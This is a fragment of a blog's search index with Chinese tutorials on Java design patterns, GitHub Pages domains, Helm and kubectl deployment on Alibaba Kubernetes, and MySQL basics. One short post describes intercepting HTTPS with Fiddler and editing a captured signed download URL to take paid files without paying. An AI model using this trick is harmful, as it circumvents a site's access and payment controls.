","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:1:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 适配器模式(Adapter Pattern) ：将一个接口转换成客户希望的另一个接口，适配器模式使接口不兼容的那些类可以一起工作。 适配器模式既可以作为类结构型模式，也可以作为对象结构型模式 定义中所提及的接口是指广义的接口，它可以表示一个方法或者方法的集合 类适配模式 对象适配模式： ","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:2:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 典型的类适配器示例代码： public class Adapter extends Adaptee implements Target {public void request() { super.specificRequest(); } 典型的对象适配器示例代码 public class Adapter extends Target { private Adaptee adaptee;//维持一个对适配者对象的引用 public Adapter(Adaptee adaptee){ this.adaptee=adaptee; } public void request() { adaptee.specificRequest();//转发调用 } } ","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:3:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 将目标类和适配者类解耦，通过引入一个适配器类来重用现有的适配者类，无须修改原有结构 增加了类的透明性和复用性，提高了适配者的复用性，同一个适配者类可以在多个不同的系统中复用 灵活性和扩展性非常好 类适配器模式：置换一些适配者的方法很方便 对象适配器模式：可以把多个不同的适配者适配到同一个目标，还可以适配一个适配者的子类 ","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:4:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 类适配器模式： (1) 一次最多只能适配一个适配者类，不能同时适配多个适配者 ​ (2) 适配者类不能为最终类 ​ (3) 目标抽象类只能为接口，不能为类 对象适配器模式：在适配器中置换适配者类的某些方法比较麻烦 ","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:5:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 系统需要使用一些现有的类，而这些类的接口不符合系统的需要，甚至没有这些类的源代码 创建一个可以重复使用的类，用于和一些彼此之间没有太大关联的类，包括一些可能在将来引进的类一起工作 ","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:6:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用实例 4-2.现有一个接口DataOperation定义了排序方法sort(int[])和查找方法search(int[],int)，已知类QuickSort的quickSort(int[])方法实现了快速排序算法，类BinarySearch的binarySearch(int[],int)方法实现了二分查找算法。现使用适配器模式设计一个系统，在不修改源代码的情况下，将QuickSort和类BinarySearch的方法适配到接口DataOperation中，绘制类图并实现。 代码： public interface DataOperation { public void sort(int data[]);//排序方法 public void search(int[] list,int key);//查找方法 } public class QuickSort { //快速排序 public void quickSort(int data[]) { java.util.Arrays.sort(data); //直接调用排序方法 print(data); } //数组输出 public void print(int data[]) { for(int x=0;x\u003cdata.length;x++) { System.out.print(data[x]+\"、\"); } } } public class BinarySearch { // 二分查找 public void binarySearch(int[] list,int key) { // 调用java.util.Arrays的binarySearch二分查找方法 System.out.print(java.util.Arrays.binarySearch(list, key)); } } public class DataAdapter implements DataOperation { private QuickSort quicksort; // 定义适配者QuickSort的对象 private BinarySearch binarysearch; // 定义适配者 BinarySearch的对象 // 构造函数初始化适配者对象 public DataAdapter() { quicksort = new QuickSort(); // 实例化QuickSort对象 binarysearch = new BinarySearch(); // 实例化 BinarySearch对象 } @Override public void sort(int data[]) { // 建立连接实现快速排序 quicksort.quickSort(data);// 通过对象调用实现快速排序的功能 } @Override public void search(int[] list, int key) { // 建立连接实现二分查找 binarysearch.binarySearch(list, key);// 通过对象调用实现二分查找的功能 } } public class Client { public static void main(String[] args) { // TODO 自动生成的方法存根 //定义一个数组 int data[]=new int[] {2,4,1,5,3,8,6,7}; DataOperation operation; //定义接口对象 operation=new DataAdapter(); // 实例化接口对象向上转型 System.out.println(\"排序前的数组：\"); for(int i=0;i\u003cdata.length;i++) { System.out.print(data[i]+\"、\"); } System.out.println(\"\\n\\n排序后的数组\"); operation.sort(data);//调用排序 //查找数据4所在的下表 System.out.println(\"\\n\\n输出数字4所在的索引:\"); operation.search(data,4);//调用查找 } } 结果： ","date":"2021-04-30","objectID":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/:7:0","tags":["适配器模式"],"title":"适配器模式","uri":"/posts/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 复制一个对象，从而克隆出多个与原型对象一模一样的对象——原型模式 有些对象的创建过程较为复杂，而且需要频繁创建 通过给出一个原型对象来指明所要创建的对象的类型，然后用复制这个原型对象的办法创建出更多同类型的对象 ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:1:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 原型模式(Prototype Pattern)：原型模式是一种对象创建型模式，用原型实例指定创建对象的种类，并且通过复制这些原型创建新的对象。 原型模式允许通过一个原型对象创建一个或多个同类型的其他对象，而无须知道任何创建的细节 ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:2:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 所有的Java类都继承自java.lang.Object，而Object类提供一个clone()方法，可以将一个Java对象复制一份 在Java中可以直接使用Object提供的clone()方法来实现对象的克隆（浅克隆） 能够实现克隆的Java类必须实现一个标识接口Cloneable，表示这个Java类支持复制 如果一个类没有实现这个接口但是调用了clone()方法，Java编译器将抛出一个CloneNotSupportedException异常 浅克隆(Shallow Clone)：当原型对象被复制时，只复制它本身和其中包含的值类型的成员变量，而引用类型的成员变量并没有复制 深克隆(Deep Clone)：除了对象本身被复制外，对象所包含的所有成员变量也将被复制 ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:3:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 简化对象的创建过程，通过复制一个已有实例可以提高新实例的创建效率 扩展性较好 简化创建结构，原型模式中产品的复制是通过封装在原型类中的克隆方法实现的，无须专门的工厂类来创建产品 可以使用深克隆的方式保存对象的状态，以便在需要的时候使用，可辅助实现撤销操作 ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:4:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 需要为每一个类配备一个克隆方法，而且该克隆方法位于一个类的内部，当对已有的类进行改造时，需要修改源代码，违背了开闭原则 在实现深克隆时需要编写较为复杂的代码，而且当对象之间存在多重的嵌套引用时，为了实现深克隆，每一层对象对应的类都必须支持深克隆，实现起来可能会比较麻烦 ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:5:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 创建新对象成本较大，新对象可以通过复制已有对象来获得，如果是相似对象，则可以对其成员变量稍作修改 系统要保存对象的状态，而对象的状态变化很小 需要避免使用分层次的工厂类来创建分层次的对象 ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:6:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用实例 1.在某OA系统中，用户可以创建工作周报，由于某些岗位每周工作存在重复性，因此可以通过复制原有工作周报并进行局部修改来快速新建工作周报。现使用原型模式来实现该功能，绘制类图并编程实现。周报内容包括姓名、日期、内容。 代码： //工作周报：具体原型类 class WeekLog implements Cloneable{ private String name; private String date; private String content; /* Getter and Setter */ public String getName() { return name; } public void setName(String name) { this.name = name; } public String getDate() { return date; } public void setDate(String date) { this.date = date; } public String getContent() { return content; } public void setContent(String content) { this.content = content; } //克隆方法clone,此处使用Java语言提供的浅克隆机制 public Object clone(){ Object obj = null; try { obj = super.clone(); return obj; }catch (CloneNotSupportedException e){ System.out.println(\"不能复制\"); return null; } } } client: class Client{ public static void main(String[] args) { WeekLog log_previous = new WeekLog(); log_previous.setName(\"张三\"); log_previous.setDate(\"2021年第13周\"); log_previous.setContent(\"这周工作很忙，每天加班！\"); System.out.println(\"****周报****\"); System.out.println(log_previous.getDate()); System.out.println(log_previous.getName()); System.out.println(log_previous.getContent()); System.out.println(\"-----------------------------\"); WeekLog log_now; log_now = (WeekLog) log_previous.clone(); log_now.setDate(\"2021年第14周\"); log_now.setContent(\"清闲的一周！\"); System.out.println(\"****周报****\"); System.out.println(log_now.getDate()); System.out.println(log_now.getName()); System.out.println(log_now.getContent()); } } 结果： ","date":"2021-04-30","objectID":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/:7:0","tags":["原型模式"],"title":"原型模式","uri":"/posts/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["hugo"],"content":"hugo   Github Pages绑定域名","date":"2021-04-28","objectID":"/posts/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/","tags":[],"title":"域名绑定","uri":"/posts/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/"},{"categories":["hugo"],"content":"域名解析设置 注册购买后，进入控制台-域名-域名列表-解析，增加一下三条记录： 记录类型选A 记录值就是ip地址，github提供了两个IP地址，192.30.252.153和192.30.252.154，这两个IP地址为github的服务器地址，两个都要填上，你还可以ping 部署在github上的地址。主机记录设置为@，线路就默认就行了。 记录类型选CNAME 记录值就是你的github博客地址。主机记录设置为www，线路就默认就行了。 ","date":"2021-04-28","objectID":"/posts/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/:1:0","tags":[],"title":"域名绑定","uri":"/posts/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/"},{"categories":["hugo"],"content":"Github Pages绑定域名 在仓库根目录下新建CNAME文件， 此时pages setting界面会自动绑定域名 之后就可以正常访问了： ","date":"2021-04-28","objectID":"/posts/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/:2:0","tags":[],"title":"域名绑定","uri":"/posts/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/"},{"categories":["运维"],"content":"本实验，你将使用 Kubernetes 包管理工具 helm 部署一个 wordpress 应用到 ack 集群中，并通过 LoadBalancer 将部署的服务暴露出来由外部访问。 通过本实验，你将学习： Helm 命令的基本用法； ","date":"2021-04-20","objectID":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/:0:0","tags":["k8s"],"title":"通过HelmCLI部署wordpress到ACK集群","uri":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"Step 2 ：部署业务应用 首先，我们需要添加 WordPress 官方Repo地址： helm3 repo add bitnami https://charts.bitnami.com/bitnami 执行 Helm Install 部署 WordPress： helm3 install wordpress bitnami/wordpress \\ --set mariadb.primary.persistence.enabled=true \\ --set mariadb.primary.persistence.storageClass=alicloud-disk-ssd \\ --set mariadb.primary.persistence.size=20Gi \\ --set persistence.enabled=false 其中： 为了实现数据的持久化，mariadb 使用持久化存储卷保存数据； 持久化存储选用阿里云 ssd 云盘，大小为 20Gi，并通过配置 StorageClassName 自动化创建； WordPress 不需要进行数据持久化，数据卷选项可配置为 false 执行成功后，应该有如下返回： NAME: wordpress LAST DEPLOYED: Wed Jan 20 15:09:45 2021 NAMESPACE: handsonack STATUS: deployed REVISION: 1 NOTES: ** Please be patient while the chart is being deployed ** Your WordPress site can be accessed through the following DNS name from within your cluster: wordpress.handsonack.svc.cluster.local (port 80) To access your WordPress site from outside the cluster follow the steps below: 1. Get the WordPress URL by running these commands: NOTE: It may take a few minutes for the LoadBalancer IP to be available. Watch the status with: 'kubectl get svc --namespace handsonack -w wordpress' export SERVICE_IP=$(kubectl get svc --namespace handsonack wordpress --template \"{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\") echo \"WordPress URL: http://$SERVICE_IP/\" echo \"WordPress Admin URL: http://$SERVICE_IP/admin\" 2. Open a browser and access WordPress using the obtained URL. 3. Login with the following credentials below to see your blog: echo Username: user echo Password: $(kubectl get secret --namespace handsonack wordpress -o jsonpath=\"{.data.wordpress-password}\" | base64 --decode) 也可以通过以下命令查看部署状态： helm3 status wordpress ","date":"2021-04-20","objectID":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/:1:0","tags":["k8s"],"title":"通过HelmCLI部署wordpress到ACK集群","uri":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"Step 3 ：访问 WordPress 应用 ","date":"2021-04-20","objectID":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/:2:0","tags":["k8s"],"title":"通过HelmCLI部署wordpress到ACK集群","uri":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"1. 获取访问地址 首先，我们需要找到刚才部署的 WordPress 的访问地址。 通过运行下面的命令来获取 WordPress 的 LoadBalancer 地址： kubectl get svc wordpress 将获得如下的返回： NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE wordpress LoadBalancer 172.21.7.165 120.79.38.52 80:32034/TCP,443:31842/TCP 117s 其中的 EXTERNAL-IP 就是当前 WordPress 应用外网可访问的 IP 地址。 通过浏览器访问该 EXTERNAL-IP 地址，我们可以看到 WordPress 应用的首页： ","date":"2021-04-20","objectID":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/:2:1","tags":["k8s"],"title":"通过HelmCLI部署wordpress到ACK集群","uri":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"2. 访问后台 为了能进入 WordPress 的后台，我们先要获取后台的用户名和密码。 前文的 helm3 status wordpress 命令的返回值已经给出了提示，访问后台的用户名就是 user。 而 user 用户的密码则需要通过下面的命令来获得： kubectl get secret wordpress -o jsonpath=\"{.data.wordpress-password}\" | base64 --decode 在终端的返回值中，你会看到类似下面的结果： TCEYTlASR8 这一段文本就是用户 user 的密码。 接着，我们需要通过地址 http://47.100.82.29/wp-admin/ 访问 WordPress 的后台： 其中的 EXTERNAL-IP 就是前文中获得的 WordPress 的 LoadBalancer 地址。 在浏览器访问后台地址，并输入用户名和密码会看到如下页面： 至此，WordPress 产品部署完成，并成功访问前台和后台。 ","date":"2021-04-20","objectID":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/:2:2","tags":["k8s"],"title":"通过HelmCLI部署wordpress到ACK集群","uri":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"Step 4 ：删除 WordPress 应用 最后，通过 uninstall 命令删除部署的workpress： helm3 uninstall wordpress ","date":"2021-04-20","objectID":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/:3:0","tags":["k8s"],"title":"通过HelmCLI部署wordpress到ACK集群","uri":"/posts/%E9%80%9A%E8%BF%87helmcli%E9%83%A8%E7%BD%B2wordpress%E5%88%B0ack%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"实验介绍 本实验，你将使用 K8s 的原生命令 kubectl 部署一个web应用的镜像到 k8s 集群中，并通过 Ingress 将部署的服务暴露出来由外部访问。 通过本实验，你将学习： kubectl 命令的基本用法； 使用 yaml 定义 K8s 资源的方法； ingress 的基本配置方法； ","date":"2021-04-20","objectID":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/:1:0","tags":["”k8s“"],"title":"使用Kubectl部署web服务到K8s集群","uri":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"部署业务应用 首先，我们需要将业务应用部署到 k8s 集群中。这里我们已经准备好了一个应用并打包成镜像，镜像地址如下： registry.cn-shanghai.aliyuncs.com/workbench1459088147016887/handsonack_test:3 这是一个使用 spring boot 开发的 java web 应用。这个应用会监听 8080 端口，接受所有路径的访问，并输出一些环境基本信息。 要让这个 web 应用的镜像在 k8s 中运行，我们首先要定义一个 deployment 资源。 通过创建deploy.yaml来描述 deployment 资源： apiVersion: apps/v1 kind: Deployment metadata: name: myapp-deployment namespace: handson-3e8b9bbfb31484d1aaddf1a82156c3bf labels: app: myapp spec: replicas: 1 selector: matchLabels: name: myapp template: metadata: labels: name: myapp namespace: handson-3e8b9bbfb31484d1aaddf1a82156c3bf spec: containers: - name: myapp image: registry.cn-shanghai.aliyuncs.com/workbench_1459088147016887/handson_ack_test:3 ports: - containerPort: 8080 其中： image 属性：就是这个 java web 应用的镜像地址； replicas 属性：代表这个应用只部署一份； 通过下面的命令执行: kubectl apply -f ~/deploy.yaml 完成后，你可以通过下面的命令查看刚才部署的 pod： kubectl get pod 看到如下提升代表应用部署完成，注意其中的 status 字段。只有 Running 才是运行中的状态哦，如果是 ContainerCreating 代表服务容器正在创建中，需要等待一段时间才能使用 NAME READY STATUS RESTARTS AGE myapp-deployment-5cd4d7c78d-lxvcw 1/1 Running 0 12s 至此，我们已经完成了应用本身的部署，下面我们看下如何在 k8s 里配置“服务”； ","date":"2021-04-20","objectID":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/:2:0","tags":["”k8s“"],"title":"使用Kubectl部署web服务到K8s集群","uri":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"部署服务 由于 deployment 是一个弹性组件，其管理的应用实例不是固定的，而是可以任意伸缩。这带来了很多的好处，例如可以支持弹性伸缩、滚动更新等等。 但是相反的，这也会导致应用实例IP不固定，从访问者的角度我们不可能每次去查找当前的应用实例。 所以，为了能提供稳定的访问入口，我们还需要部署“服务”来接收请求，并屏蔽内部的弹性机制。 部署服务，我们继续 yaml 文件的方式操作，创建 service.yaml： apiVersion: v1 kind: Service metadata: name: myapp-service namespace: handson-3e8b9bbfb31484d1aaddf1a82156c3bf spec: ports: - port: 8080 targetPort: 8080 protocol: TCP type: NodePort selector: name: myapp 我们看到 Service 的定义相对简单很多，其中有几个关键属性需要说明： selector，这是一个选择器，通过 name=myapp 这个条件来选择需要代理的服务 ports，这里定义了服务自身暴露的端口和需要访问的应用的端口 继续通过 kubectl 命令执行： kubectl apply -f ~/service.yaml 然后通过下面的命令查看刚才部署的 service： kubectl get service 我们会看到下面的反馈信息： NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE myapp-service NodePort 172.21.12.82 \u003cnone\u003e 8080:30163/TCP 2s 这里我们就完成了 service 的部署。下面通过 ingress 将内部的服务暴露出去。 ","date":"2021-04-20","objectID":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/:3:0","tags":["”k8s“"],"title":"使用Kubectl部署web服务到K8s集群","uri":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"配置 ingress 开放外部访问 k8s 是一个集群，deployment、service 都是集群内部的资源，他们通过一个内部虚拟网络互相访问。 但是对于外部的用户，这些所有的资源都是不可见的，所以我们还需要配置一个外部访问的入口到 service 的映射规则，从而将内部服务暴露出去。 这里我们就需要使用 ingress 的来实现服务对外暴露的需求。 我们继续使用 yaml 来定义 ingress 规则： apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: example-ingress namespace: handson-3e8b9bbfb31484d1aaddf1a82156c3bf spec: rules: - http: paths: - path: /welcome backend: serviceName: myapp-service servicePort: 8080 继续通过 kubectl 命令执行： kubectl apply -f ~/ingress.yaml 然后通过下面的命令查看刚才部署的 service： kubectl get ingress 我们会看到下面的反馈信息： NAME CLASS HOSTS ADDRESS PORTS AGE example-ingress \u003cnone\u003e * 47.100.138.224 80 72s 通过这个返回值信息，我们可以看到，访问地址是47.100.138.224，端口是80。 所以我们可以通过下面的链接访问刚才部署的应用：http://47.100.138.224/welcome 除了部署服务，我们还需要能卸载相关资源，才算完整的流程 ","date":"2021-04-20","objectID":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/:4:0","tags":["”k8s“"],"title":"使用Kubectl部署web服务到K8s集群","uri":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/"},{"categories":["运维"],"content":"卸载资源 光是配置并提供服务只完成了一半的工作，完整的操作周期除了正向的安装，还包含了逆向的卸载，下面我们就来学习如何把刚才配置的各种资源给卸载掉。 资源卸载我们就不使用 yaml 脚本了，直接使用 kubectl 命令就可以完成： 卸载 ingress kubectl delete ingress example-ingress 卸载 service kubectl delete service myapp-service 卸载 deployment kubectl delete deployment myapp-deployment 至此玩我们就完成了卸载工作，最后再用下面的命令确认一下我们的卸载结果： kubectl get deployment kubectl get service kubectl get ingress 你可能会看到： NAME READY STATUS RESTARTS AGE pod/myapp-deployment-5cd4d7c78d-kx7kn 0/1 Terminating 0 29m Terminating 代表 pod 正在卸载中，多运行几次后，会看到下面的提示： No resources found in handson-3e8b9bbfb31484d1aaddf1a82156c3bf namespace. 代表卸载工作完成 ","date":"2021-04-20","objectID":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/:5:0","tags":["”k8s“"],"title":"使用Kubectl部署web服务到K8s集群","uri":"/posts/%E4%BD%BF%E7%94%A8kubectl%E9%83%A8%E7%BD%B2web%E6%9C%8D%E5%8A%A1%E5%88%B0k8s%E9%9B%86%E7%BE%A4/"},{"categories":["Tools"],"content":"下载站点 工具：Fiddler 1、打开Fiddler工具，开启Https代理： 2、登录账户，会有50个币，点击页面下载发现Fiddler中并没有拿到下载接口，所以用50币先下载一个能够下载的，先拿到接口： 只能拿到相对路由，手动下载，拿到接口： 接口： https://kuangstudy.oss-cn-beijing.aliyuncs.com/download/note/JavaScript_hvtser8u0.rar?Expires=1618756583\u0026OSSAccessKeyId=LTAI4G9FmSQ5cVvkR2ZVjSYi\u0026Signature=LuaKA5VVvNrPAYERGfvrwC7%2BeXQ%3D 只用把其中的下载路径换一下就OK了 ","date":"2021-04-18","objectID":"/posts/kuangdownload/:0:0","tags":["KuangDownload"],"title":"KuangDownload","uri":"/posts/kuangdownload/"},{"categories":["数据库"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net 1、初识MySQL JavaEE：企业级Java开发 Web 前端（页面：展示：数据） 后台 （连接点：连接数据库JDBC,连接前端（控制视图跳转，给前端传递数据）） 数据库（存数据，Txt,Excel,Word） 只会写代码，学好数据库，基本混饭吃： 操作系统，数据结构与算法！当一个不错的程序猿！ 离散数学，数字电路，体系结构，编译原理。+实战经验，优秀程序猿 ","date":"2021-04-17","objectID":"/posts/mysql/:0:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"1.1为什么学数据库 1、岗位需求 2、现在的世界，大数据时代，得数据者得天下 3、被迫需求：存数据 4、数据库是所有软件体系中最核心的存在 DBA ","date":"2021-04-17","objectID":"/posts/mysql/:1:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"1.2 什么是数据库 数据库：(DB,DataBase) 概念:数据仓库，软件，安装在操作系统之（windows,Linux。mac）上的！SQL,可以存储大量的数据，500万! 作用:存储数据，管理数据 Excel ","date":"2021-04-17","objectID":"/posts/mysql/:2:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"1.3 数据库分类 关系型数据库：(SQL) MySQL, Oracle, sql Server, DB2, SQLite 通过表和表之间，行和列之间的关系进行数据的存储 非关系型数据库：(NoSQL) Not Only SQL Redis, MongDB 非关系型数据库，对象存储，通过对象自身的属性来决定。 **DBMS(数据库管理系统) ** 数据库的管理软件，科学有效的管理我们的数据，维护和获取 MySQL ，数据管理系统！ ","date":"2021-04-17","objectID":"/posts/mysql/:3:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"1.4 MySQL简介 MySQL是一个**关系型数据库管理系统** 前世： 瑞典MySQL AB 公司 今身： 属于 Oracle 旗下产品 MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件之一。 开源的数据库软件 体积小，速度快，总体拥有成本低，招人成本比较低。 中小型网站，或者大型网站，集群 官网： https://www.mysql.com/ ","date":"2021-04-17","objectID":"/posts/mysql/:4:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"1.5连接数据库 命令行连接！ `mysql -u root -p123456 --连接数据库 update mysql.user set authentication_string=password('123456') where user='root' and Host='localhost'; --修改密码 flush privileges;--刷新权限 -------------------------------------------------- --所有语句使用;结尾-- show databases;--查看所有的数据库 mysql\u003e use school--切换数据库， use 数据库名 Database changed -- show tables;--查看数据库中所有的表 describe student;--显示数据库中所有的表的信息 create database westos;--创建一个数据库 exit;--退出连接 --单行注释（sql本来注释） /* 多行注释 */` 2、操作数据库 操作数据库》操作数据库中的表》操作数据库中表的数据 MySQL不区分大小写 ","date":"2021-04-17","objectID":"/posts/mysql/:5:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"2.1操作数据库 1.创建数据库 `CREATE DATABASE IF NOT EXISTS westos;` 2.删除数据库 `DROP DATABASE IF EXISTS westos` 3.使用数据库 `-- ``,如果你的表名或者字段名是一个特殊字符，需要带`` USE 'school'` 4.产看数据库 `SHOW DATABASES--查看所有数据库` ","date":"2021-04-17","objectID":"/posts/mysql/:6:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"2.2数据库的列类型 数值 tinyint 十分小的数据 1个字节 smallint 较小的数据 2个字节 mediumint 中等大小 3个字节 int 标准的整数 4个字节（常用） bigint 较大的数据 8个字节 float 浮点数 4个字节 double 浮点数 8个字节 （精度问题） decimal 字符串形式的浮点数,金融计算的时候，一般用 字符串 char 字符串固定大小 0-255 varchar 可变字符串 0-65535（常用） tinytext 微型文本 2^8-1 text 文本串 2^16-1 (保存大文本) 时间日期 java.util.Date date YYYY-MM-DD，日期 time HH:mm:ss 时间格式 datetime YYYY-MM-DD HH:mm:ss 最常用的时间格式 timestamp 时间戳 1970.1.1到现在的毫秒数 year 年份表示 null 没有值，未知 注意，不要使用null进行运算，结果为null 